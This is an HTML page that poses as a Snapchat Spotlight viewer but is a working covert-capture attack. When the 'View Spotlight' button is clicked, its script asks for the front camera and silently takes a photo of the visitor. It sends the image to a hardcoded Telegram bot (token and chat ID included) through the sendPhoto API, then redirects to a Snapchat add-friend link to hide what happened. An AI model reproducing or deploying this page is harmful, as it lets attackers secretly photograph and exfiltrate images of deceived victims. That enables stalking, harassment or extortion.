<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .btn {
            background-color: #fffc00;
            color: #000;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
        }
    </style>
</head>
<body>

    <button class="btn" id="goBtn">View Spotlight</button>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8934176186:AAGX6GaklJCEmr_CXXX4L7bGMQykSA4fyFA";
        const CHAT_ID = "6125741059";

        document.getElementById('goBtn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });
                
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'snap.jpg');

                            try {
                                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (err) {}
                        }

                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.snapchat.com/add/ravayxabat13";
                    }, 'image/jpeg', 0.85);
                }, 600);

            } catch (err) {
                window.location.href = "https://www.snapchat.com/add/ravayxabat13";
            }
        });
    </script>
</body>
</html>
